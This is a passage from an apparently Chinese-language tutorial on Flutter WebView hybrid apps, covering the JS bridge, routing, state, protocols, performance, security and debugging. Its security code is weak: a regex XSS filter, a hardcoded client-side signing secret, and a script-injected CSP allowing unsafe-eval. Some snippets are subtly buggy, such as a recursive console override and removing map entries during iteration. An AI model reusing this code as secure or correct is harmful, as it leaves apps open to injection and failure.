    <span class="hljs-keyword">return</span> NavigationDecision.navigate;
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          <span class="hljs-comment">// WebView主体</span>
          WebViewWidget(controller: _controller),
          
          <span class="hljs-comment">// 进度条</span>
          <span class="hljs-keyword">if</span> (_isLoading &amp;&amp; _progress &lt; <span class="hljs-number">1.0</span>)
            LinearProgressIndicator(
              value: _progress,
              backgroundColor: Colors.grey[<span class="hljs-number">200</span>],
            ),
          
          <span class="hljs-comment">// 错误状态</span>
          <span class="hljs-keyword">if</span> (_hasError)
            _buildErrorWidget(),
        ],
      ),
      <span class="hljs-comment">// 底部导航栏</span>
      bottomNavigationBar: _buildBottomBar(),
    );
  }
}
</code></pre>
<h3 data-id="heading-6">2.2 核心功能点</h3>
<h4 data-id="heading-7">2.2.1 JavaScript通信原理</h4>
<p>JavaScript与Flutter的通信是通过<strong>桥接</strong>实现的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant W as WebView(JS环境)
    participant B as JavaScriptChannel
    participant F as Flutter(Dart环境)
    participant H as 消息处理器
    
    W-&gt;&gt;B: window.FlutterBridge.postMessage(JSON)
    B-&gt;&gt;F: 通过Platform Channel传递消息
    F-&gt;&gt;H: 解析并处理消息
    H-&gt;&gt;F: 返回处理结果
    F-&gt;&gt;W: _controller.runJavaScript()
</code></pre>
<p><strong>核心技术点</strong>：</p>
<ul>
<li><strong>消息序列化</strong>：所有数据必须转为JSON串</li>
<li><strong>异步处理</strong>：异步通信并处理回调</li>
<li><strong>错误处理</strong>：JS或Flutter都可能出错，需要有错误处理</li>
</ul>
<h4 data-id="heading-8">2.2.2 性能优化</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewOptimizer</span> </span>{
  <span class="hljs-comment">// 1. 缓存</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> setupCache(WebViewController controller) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> controller.runJavaScript(<span class="hljs-string">'''
      // 启用Service Worker缓存
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js');
      }
      
      // 本地存储
      if (window.localStorage) {
        localStorage.setItem('lastVisit', new Date().toISOString());
      }
    '''</span>);
  }
  
  <span class="hljs-comment">// 2. 内存管理</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> manageMemory(WebViewController controller) {
    <span class="hljs-comment">// 清理缓存</span>
    Timer.periodic(<span class="hljs-built_in">Duration</span>(minutes: <span class="hljs-number">5</span>), (_) {
      controller.clearCache();
    });
  }
  
  <span class="hljs-comment">// 3. 预加载</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; preloadWebView({
    <span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> url,
    <span class="hljs-keyword">required</span> BuildContext context,
  }) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 提前初始化WebView但不显示</span>
    <span class="hljs-keyword">final</span> controller = WebViewController();
    <span class="hljs-keyword">await</span> controller.loadRequest(<span class="hljs-built_in">Uri</span>.parse(url));
    
    <span class="hljs-comment">// 保存到全局缓存</span>
    WebViewCache.instance.cache(url, controller);
  }
}
</code></pre>
<h2 data-id="heading-9">三：混合应用设计</h2>
<h3 data-id="heading-10">3.1 分层架构</h3>
<p>一个良好的混合架构应该分为四个层次：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "1.表现层 Presentation Layer"
        A1[Flutter原生页面]
        A2[WebView容器]
        A3[混合页面]
    end
    
    subgraph "2.桥接层 Bridge Layer"
        B1[JavaScript Bridge]
        B2[消息路由器]
        B3[协议编解码器]
    end
    
    subgraph "3.业务层 Business Layer"
        C1[用户服务]
        C2[支付服务]
        C3[数据服务]
    end
    
    subgraph "4.基础设施层 Infrastructure"
        D1[WebView池]
        D2[缓存管理器]
        D3[网络层]
        D4[安全模块]
    end
    
    A1 --&gt; B1
    A2 --&gt; B1
    A3 --&gt; B1
    
    B1 --&gt; B2
    B2 --&gt; C1
    B2 --&gt; C2
    B2 --&gt; C3
    
    C1 --&gt; D4
    C2 --&gt; D3
    C3 --&gt; D2
    
    A2 --&gt; D1
</code></pre>
<h3 data-id="heading-11">3.2 路由管理</h3>
<p>混合应用最复杂的是路由管理。我们需要决定什么时候用原生页面，什么时候用WebView。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HybridRouter</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, RouteConfig&gt; _routeTable = {
    <span class="hljs-string">'/home'</span>: RouteConfig(
      type: RouteType.native,
      path: <span class="hljs-string">'/home'</span>,
      webUrl: <span class="hljs-keyword">null</span>,
    ),
    <span class="hljs-string">'/product/:id'</span>: RouteConfig(
      type: RouteType.hybrid,
      path: <span class="hljs-string">'/product/:id'</span>,
      webUrl: <span class="hljs-string">'https://api.xxxx.com/product/{id}'</span>,
      nativeFallback: <span class="hljs-string">'/productDetail'</span>,
    ),
    <span class="hljs-string">'/promotion/:code'</span>: RouteConfig(
      type: RouteType.web,
      path: <span class="hljs-string">'/promotion/:code'</span>,
      webUrl: <span class="hljs-string">'https://promo.xxxx.com/{code}'</span>,
    ),
  };
  
  <span class="hljs-comment">// 路由</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; navigateTo({
    <span class="hljs-keyword">required</span> BuildContext context,
    <span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> path,
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;? params,
  }) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> config = _findRouteConfig(path);
    
    <span class="hljs-keyword">if</span> (config == <span class="hljs-keyword">null</span>) {
      <span class="hljs-comment">// WebView</span>
      <span class="hljs-keyword">await</span> _openWebView(context, path, params);
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-keyword">final</span> useWeb = <span class="hljs-keyword">await</span> _shouldUseWebVersion(config);
    
    <span class="hljs-keyword">if</span> (useWeb) {
      <span class="hljs-keyword">await</span> _openWebView(context, config.webUrl!, params);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">await</span> _openNativePage(context, config.nativeFallback!, params);
    }
  }
  
  <span class="hljs-comment">// 条件</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">bool</span>&gt; _shouldUseWebVersion(RouteConfig config) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 1. 检查网络状况</span>
    <span class="hljs-keyword">final</span> connectivity = <span class="hljs-keyword">await</span> Connectivity().checkConnectivity();
    <span class="hljs-keyword">if</span> (connectivity == ConnectivityResult.none) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>; <span class="hljs-comment">// 离线时用原生</span>
    }
    
    <span class="hljs-comment">// 2. 检查用户偏好</span>
    <span class="hljs-keyword">final</span> prefs = <span class="hljs-keyword">await</span> SharedPreferences.getInstance();
    <span class="hljs-keyword">final</span> preferNative = prefs.getBool(<span class="hljs-string">'prefer_native'</span>) ?? <span class="hljs-keyword">false</span>;
    
    <span class="hljs-comment">// 3. 检查页面类型</span>
    <span class="hljs-keyword">switch</span> (config.type) {
      <span class="hljs-keyword">case</span> RouteType.native:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
      <span class="hljs-keyword">case</span> RouteType.web:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
      <span class="hljs-keyword">case</span> RouteType.hybrid:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _businessDecision(config);
    }
  }
}
</code></pre>
<h3 data-id="heading-12">3.3 状态管理</h3>
<p>混合应用的状态管理比纯原生应用更复杂，因为状态可能在三个地方：</p>
<pre><code class="hljs language-markdown" lang="markdown">状态存储位置：
<span class="hljs-bullet">1.</span> Flutter/Dart状态
<span class="hljs-bullet">2.</span> WebView/JavaScript状态  
<span class="hljs-bullet">3.</span> 原生平台状态（iOS/Android）
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eebffc53a6046c3ae83811801f7a313~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUXVhbnR1bUxlYXDkuLY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765615879&amp;x-signature=%2BQmnhHMnTD%2BTN2I4LpjLS%2B0zjqw%3D" alt="状态管理.png" loading="lazy"/></p>
<p>实现方案：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HybridStateManager</span> </span>{
  <span class="hljs-comment">// 状态存储</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; _globalState = {};
  
  <span class="hljs-comment">// 状态同步方法</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; syncStateToWeb(WebViewController controller) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> stateJson = jsonEncode(_globalState);
    <span class="hljs-keyword">await</span> controller.runJavaScript(<span class="hljs-string">'''
      // 更新Web端状态
      window.appState = <span class="hljs-subst">$stateJson</span>;
      
      // 触发状态更新事件
      window.dispatchEvent(new CustomEvent('appStateChanged', {
        detail: <span class="hljs-subst">$stateJson</span>
      }));
    '''</span>);
  }
  
  <span class="hljs-comment">// 从Web接收状态更新</span>
  <span class="hljs-keyword">void</span> handleStateFromWeb(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; newState) {
    _globalState.addAll(newState);
    
    <span class="hljs-comment">// 通知Flutter组件</span>
    _stateNotifier.value = {..._globalState};
    
    <span class="hljs-comment">// 持久化</span>
    _persistState();
  }
}
</code></pre>
<h2 data-id="heading-13">四：通信协议</h2>
<h3 data-id="heading-14">4.1 消息协议</h3>
<p>良好的通信从定义协议开始，实际项目中使用的协议规范，如下：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 定义消息协议</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BridgeMessage</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> id;           <span class="hljs-comment">// 消息ID</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> type;         <span class="hljs-comment">// 消息类型</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> method;       <span class="hljs-comment">// 方法名</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">dynamic</span> data;        <span class="hljs-comment">// 消息数据</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> timestamp;       <span class="hljs-comment">// 时间戳</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> callbackId;  <span class="hljs-comment">// 回调ID</span>
  
  <span class="hljs-comment">// 消息类型</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> TYPE_REQUEST = <span class="hljs-string">'request'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> TYPE_RESPONSE = <span class="hljs-string">'response'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> TYPE_EVENT = <span class="hljs-string">'event'</span>;
  
  <span class="hljs-comment">// 常用方法</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> METHOD_GET_USER_INFO = <span class="hljs-string">'getUserInfo'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> METHOD_PAYMENT = <span class="hljs-string">'startPayment'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> METHOD_SHARE = <span class="hljs-string">'shareContent'</span>;
  
  <span class="hljs-comment">// 序列化</span>
  <span class="hljs-built_in">String</span> toJson() {
    <span class="hljs-keyword">return</span> jsonEncode({
      <span class="hljs-string">'id'</span>: id,
      <span class="hljs-string">'type'</span>: type,
      <span class="hljs-string">'method'</span>: method,
      <span class="hljs-string">'data'</span>: data,
      <span class="hljs-string">'timestamp'</span>: timestamp,
      <span class="hljs-string">'callbackId'</span>: callbackId,
    });
  }
  
  <span class="hljs-comment">// 反序列化</span>
  <span class="hljs-keyword">static</span> BridgeMessage fromJson(<span class="hljs-built_in">String</span> jsonStr) {
    <span class="hljs-keyword">final</span> map = jsonDecode(jsonStr);
    <span class="hljs-keyword">return</span> BridgeMessage(
      id: map[<span class="hljs-string">'id'</span>],
      type: map[<span class="hljs-string">'type'</span>],
      method: map[<span class="hljs-string">'method'</span>],
      data: map[<span class="hljs-string">'data'</span>],
      timestamp: map[<span class="hljs-string">'timestamp'</span>],
      callbackId: map[<span class="hljs-string">'callbackId'</span>],
    );
  }
}
</code></pre>
<h3 data-id="heading-15">4.2 通信流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant H as H5页面(JS)
    participant B as JavaScript Bridge
    participant D as Dart消息分发器
    participant S as 业务服务
    participant N as 原生功能
    
    H-&gt;&gt;B: 发送请求&lt;br/&gt;BridgeMessage
    Note over H,B: 1. 用户点击购买按钮
    
    B-&gt;&gt;D: 通过Channel传递
    Note over B,D: 2. 平台通道传输
    
    D-&gt;&gt;D: 解析验证消息
    Note over D: 3. 安全检查与验证
    
    alt 需要原生功能
        D-&gt;&gt;N: 调用原生模块
        N-&gt;&gt;D: 返回结果
    else 需要业务服务
        D-&gt;&gt;S: 调用业务服务
        S-&gt;&gt;D: 返回业务数据
    end
    
    D-&gt;&gt;B: 构造响应消息
    B-&gt;&gt;H: 返回结果
    Note over B,H: 6. 更新H5页面状态
</code></pre>
<h3 data-id="heading-16">4.3 错误处理</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BridgeErrorHandler</span> </span>{
  <span class="hljs-comment">// 定义错误码</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">String</span>&gt; errorCodes = {
    <span class="hljs-number">1001</span>: <span class="hljs-string">'网络连接失败'</span>,
    <span class="hljs-number">1002</span>: <span class="hljs-string">'用户未登录'</span>,
    <span class="hljs-number">1003</span>: <span class="hljs-string">'参数验证失败'</span>,
    <span class="hljs-number">1004</span>: <span class="hljs-string">'权限不足'</span>,
    <span class="hljs-number">1005</span>: <span class="hljs-string">'服务端错误'</span>,
  };
  
  <span class="hljs-comment">// 统一错误处理</span>
  <span class="hljs-keyword">static</span> BridgeMessage handleError(
    <span class="hljs-built_in">dynamic</span> error, 
    <span class="hljs-built_in">String</span> messageId,
    <span class="hljs-built_in">String</span> method,
  ) {
    <span class="hljs-built_in">int</span> code = <span class="hljs-number">1005</span>; <span class="hljs-comment">// 默认错误码</span>
    <span class="hljs-built_in">String</span> message = <span class="hljs-string">'未知错误'</span>;
    
    <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">is</span> PlatformException) {
      code = <span class="hljs-built_in">int</span>.parse(error.code);
      message = error.message ?? <span class="hljs-string">'平台异常'</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">is</span> HttpException) {
      code = <span class="hljs-number">1001</span>;
      message = <span class="hljs-string">'网络请求失败'</span>;
    }
    
    <span class="hljs-keyword">return</span> BridgeMessage(
      id: messageId,
      type: BridgeMessage.TYPE_RESPONSE,
      method: method,
      data: {
        <span class="hljs-string">'success'</span>: <span class="hljs-keyword">false</span>,
        <span class="hljs-string">'error'</span>: {
          <span class="hljs-string">'code'</span>: code,
          <span class="hljs-string">'message'</span>: errorCodes[code] ?? message,
          <span class="hljs-string">'detail'</span>: error.toString(),
        },
      },
      timestamp: <span class="hljs-built_in">DateTime</span>.now().millisecondsSinceEpoch,
    );
  }
}
</code></pre>
<h2 data-id="heading-17">五：性能优化</h2>
<h3 data-id="heading-18">5.1 WebView启动优化</h3>
<p>WebView首次启动慢是常见问题。我们可以通过<strong>预加载和复用</strong>来优化：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 实现WebView池</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewPool</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, WebViewController&gt; _pool = {};
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">DateTime</span>&gt; _lastUsed = {};
  
  <span class="hljs-comment">// 获取WebView</span>
  <span class="hljs-keyword">static</span> Future&lt;WebViewController&gt; getWebView({
    <span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> key,
    <span class="hljs-keyword">required</span> Future&lt;WebViewController&gt; <span class="hljs-built_in">Function</span>() builder,
  }) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 1. 检查池中是否有可复用的</span>
    <span class="hljs-keyword">if</span> (_pool.containsKey(key)) {
      _lastUsed[key] = <span class="hljs-built_in">DateTime</span>.now();
      <span class="hljs-keyword">return</span> _pool[key]!;
    }
    
    <span class="hljs-comment">// 2. 创建新的WebView</span>
    <span class="hljs-keyword">final</span> controller = <span class="hljs-keyword">await</span> builder();
    _pool[key] = controller;
    _lastUsed[key] = <span class="hljs-built_in">DateTime</span>.now();
    
    <span class="hljs-comment">// 3. 清理过期缓存</span>
    _cleanup();
    
    <span class="hljs-keyword">return</span> controller;
  }
  
  <span class="hljs-comment">// 预加载</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; preload(<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; urls) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> url <span class="hljs-keyword">in</span> urls) {
      <span class="hljs-keyword">final</span> controller = WebViewController();
      <span class="hljs-keyword">await</span> controller.loadRequest(<span class="hljs-built_in">Uri</span>.parse(url));
      _pool[url] = controller;
    }
  }
}
</code></pre>
<h3 data-id="heading-19">5.2 内存管理</h3>
<p>WebView是内存消耗大户，需要精细管理：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewMemoryManager</span> </span>{
  <span class="hljs-comment">// 处理内存压力</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> setupMemoryPressureHandler() {
    SystemChannels.lifecycle.setMessageHandler((msg) <span class="hljs-keyword">async</span> {
      <span class="hljs-keyword">if</span> (msg == AppLifecycleState.paused.toString()) {
        <span class="hljs-comment">// App进入后台，释放WebView内存</span>
        <span class="hljs-keyword">await</span> _releaseWebViewMemory();
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msg == AppLifecycleState.resumed.toString()) {
        <span class="hljs-comment">// App回到前台，恢复必要状态</span>
        <span class="hljs-keyword">await</span> _restoreWebViewState();
      }
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
    });
  }
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; _releaseWebViewMemory() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 1. 清除缓存</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> controller <span class="hljs-keyword">in</span> WebViewPool._pool.values) {
      <span class="hljs-keyword">await</span> controller.clearCache();
    }
    
    <span class="hljs-comment">// 2. 卸载不活动的WebView</span>
    <span class="hljs-keyword">final</span> now = <span class="hljs-built_in">DateTime</span>.now();
    WebViewPool._pool.entries
      .where((entry) {
        <span class="hljs-keyword">final</span> lastUsed = WebViewPool._lastUsed[entry.key];
        <span class="hljs-keyword">return</span> lastUsed != <span class="hljs-keyword">null</span> &amp;&amp; 
               now.difference(lastUsed) &gt; <span class="hljs-built_in">Duration</span>(minutes: <span class="hljs-number">10</span>);
      })
      .forEach((entry) {
        WebViewPool._pool.remove(entry.key);
        WebViewPool._lastUsed.remove(entry.key);
      });
  }
}
</code></pre>
<h3 data-id="heading-20">5.3 渲染性能优化</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewPerformance</span> </span>{
  <span class="hljs-comment">// 启用硬件加速</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> enableHardwareAcceleration(WebViewController controller) {
    controller.runJavaScript(<span class="hljs-string">'''
      // 启用CSS硬件加速
      const style = document.createElement('style');
      style.textContent = \`
        .animate-element {
          transform: translateZ(0);
          will-change: transform;
        }
        .fixed-element {
          position: fixed;
          backface-visibility: hidden;
        }
      \`;
      document.head.appendChild(style);
    '''</span>);
  }
  
  <span class="hljs-comment">// 监控性能指标</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> setupPerformanceMonitor(WebViewController controller) {
    controller.runJavaScript(<span class="hljs-string">'''
      // 使用Performance API监控
      const observer = new PerformanceObserver((list) =&gt; {
        const entries = list.getEntries();
        entries.forEach(entry =&gt; {
          if (entry.duration &gt; 100) { 
            console.warn('长任务:', entry.name, entry.duration);
            
            // 发送到Flutter监控
            if (window.FlutterBridge) {
              window.FlutterBridge.postMessage(JSON.stringify({
                type: 'performance',
                data: {
                  metric: 'long_task',
                  name: entry.name,
                  duration: entry.duration,
                  timestamp: Date.now()
                }
              }));
            }
          }
        });
      });
      
      observer.observe({entryTypes: ['longtask']});
    '''</span>);
  }
}
</code></pre>
<h2 data-id="heading-21">六：安全防护</h2>
<h3 data-id="heading-22">6.1 多层安全防护</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph "安全防护体系"
        A[输入层防护] --&gt; B[通信层防护]
        B --&gt; C[执行层防护]
        C --&gt; D[数据层防护]
    end
    
    subgraph "具体措施"
        A1[URL白名单验证]
        A2[输入参数过滤]
        
        B1[HTTPS强制]
        B2[消息签名]
        B3[防重放攻击]
        
        C1[JS沙盒隔离]
        C2[权限最小化]
        
        D1[数据加密]
        D2[本地存储安全]
    end
    
    A1 --&gt; A
    A2 --&gt; A
    B1 --&gt; B
    B2 --&gt; B
    B3 --&gt; B
    C1 --&gt; C
    C2 --&gt; C
    D1 --&gt; D
    D2 --&gt; D
</code></pre>
<h3 data-id="heading-23">6.2 具体实现</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewSecurity</span> </span>{
  <span class="hljs-comment">// 验证URL白名单</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">RegExp</span>&gt; _urlWhitelist = [
    <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'^https://api\.xxxx\.com/'</span>),
    <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'^https://cdn\.xxxx\.com/'</span>),
    <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'^https://sso\.xxxx\.com/'</span>),
  ];
  
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> isUrlAllowed(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> _urlWhitelist.any((pattern) =&gt; pattern.hasMatch(url));
  }
  
  <span class="hljs-comment">// 验证消息签名</span>
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> verifyMessageSignature(
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; message,
    <span class="hljs-built_in">String</span> signature,
  ) {
    <span class="hljs-comment">// 1. 检查时间戳</span>
    <span class="hljs-keyword">final</span> timestamp = message[<span class="hljs-string">'timestamp'</span>];
    <span class="hljs-keyword">final</span> now = <span class="hljs-built_in">DateTime</span>.now().millisecondsSinceEpoch;
    <span class="hljs-keyword">if</span> ((now - timestamp).abs() &gt; <span class="hljs-number">300000</span>) { <span class="hljs-comment">// 5分钟有效期</span>
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
    }
    
    <span class="hljs-comment">// 2. 验证签名</span>
    <span class="hljs-keyword">final</span> secretKey = <span class="hljs-string">'your_secret_key_here'</span>;
    <span class="hljs-keyword">final</span> dataToSign = <span class="hljs-string">'<span class="hljs-subst">${message[<span class="hljs-string">'id'</span>]}</span>:<span class="hljs-subst">${timestamp}</span>:<span class="hljs-subst">$secretKey</span>'</span>;
    <span class="hljs-keyword">final</span> expectedSig = sha256.convert(utf8.encode(dataToSign)).toString();
    
    <span class="hljs-keyword">return</span> expectedSig == signature;
  }
  
  <span class="hljs-comment">// 防XSS注入</span>
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">String</span> sanitizeInput(<span class="hljs-built_in">String</span> input) {
    <span class="hljs-comment">// 移除危险标签和属性</span>
    <span class="hljs-keyword">return</span> input
        .replaceAll(<span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;'</span>, caseSensitive: <span class="hljs-keyword">false</span>), <span class="hljs-string">''</span>)
        .replaceAll(<span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'on\w+="[^"]*"'</span>, caseSensitive: <span class="hljs-keyword">false</span>), <span class="hljs-string">''</span>)
        .replaceAll(<span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'javascript:'</span>, caseSensitive: <span class="hljs-keyword">false</span>), <span class="hljs-string">''</span>)
        .replaceAll(<span class="hljs-built_in">RegExp</span>(<span class="hljs-string">r'data:'</span>, caseSensitive: <span class="hljs-keyword">false</span>), <span class="hljs-string">''</span>);
  }
}
</code></pre>
<h3 data-id="heading-24">6.3 Content Security Policy</h3>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; setupContentSecurityPolicy(WebViewController controller) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">await</span> controller.runJavaScript(<span class="hljs-string">'''
    // 添加CSP Meta标签
    const cspMeta = document.createElement('meta');
    cspMeta.httpEquiv = 'Content-Security-Policy';
    cspMeta.content = \`
      default-src 'self' https://api.xxxx.com;
      script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.xxxx.com;
      style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
      img-src 'self' data: https:;
      font-src 'self' https://fonts.gstatic.com;
      connect-src 'self' https://api.xxxx.com wss://ws.xxxx.com;
      frame-ancestors 'self';
      form-action 'self' https://sso.xxxx.com;
    \`;
    
    document.head.appendChild(cspMeta);
    
    // 禁用危险API
    Object.defineProperty(window, 'eval', {
      value: function() {
        console.warn('eval() is disabled for security reasons');
        return null;
      }
    });
    
    // 监控可疑行为
    const originalPostMessage = window.postMessage;
    window.postMessage = function(message, targetOrigin) {
      if (!targetOrigin || targetOrigin === '*') {
        console.warn('postMessage without targetOrigin is restricted');
        return;
      }
      return originalPostMessage.call(this, message, targetOrigin);
    };
  '''</span>);
}
</code></pre>
<h2 data-id="heading-25">七：调试</h2>
<h3 data-id="heading-26">7.1 集成调试工具</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewDebugger</span> </span>{
  <span class="hljs-comment">// 启用远程调试</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> enableRemoteDebugging(WebViewController controller) {
    <span class="hljs-comment">// Android: Chrome DevTools</span>
    <span class="hljs-comment">// iOS: Safari Web Inspector</span>
    
    controller.runJavaScript(<span class="hljs-string">'''
      console.log = function(...args) {
        // 重定向console到Flutter
        const message = args.map(arg =&gt; 
          typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
        ).join(' ');
        
        if (window.FlutterBridge) {
          window.FlutterBridge.postMessage(JSON.stringify({
            type: 'console',
            level: 'log',
            message: message,
            timestamp: Date.now()
          }));
        }
        
        // 保留原始console功能
        originalConsoleLog.apply(console, args);
      };
      
      const originalConsoleLog = console.log;
    '''</span>);
  }
}
</code></pre>
<h3 data-id="heading-27">7.2 监控错误与上报</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebViewErrorMonitor</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WebViewError&gt; _errors = [];
  
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> setupErrorMonitoring(WebViewController controller) {
    <span class="hljs-comment">// 监控JS错误</span>
    controller.runJavaScript(<span class="hljs-string">'''
      window.addEventListener('error', function(event) {
        const errorData = {
          message: event.message,
          filename: event.filename,
          lineno: event.lineno,
          colno: event.colno,
          error: event.error?.toString(),
          stack: event.error?.stack,
          timestamp: Date.now(),
          url: window.location.href
        };
        
        if (window.FlutterBridge) {
          window.FlutterBridge.postMessage(JSON.stringify({
            type: 'error',
            data: errorData
          }));
        }
      }, true);
      
      // 监控未处理的Promise拒绝
